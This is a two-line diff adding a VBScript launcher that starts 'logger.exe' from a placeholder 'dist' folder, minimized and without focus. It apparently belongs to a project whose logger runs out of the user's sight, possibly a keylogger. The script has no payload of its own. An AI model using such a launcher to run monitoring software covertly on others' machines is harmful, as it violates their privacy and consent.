@@ -1,0 +1,2 @@
+Set WshShell = CreateObject("WScript.Shell")
+WshShell.Run "path-of-ur-folder\dist\logger.exe", 7, False
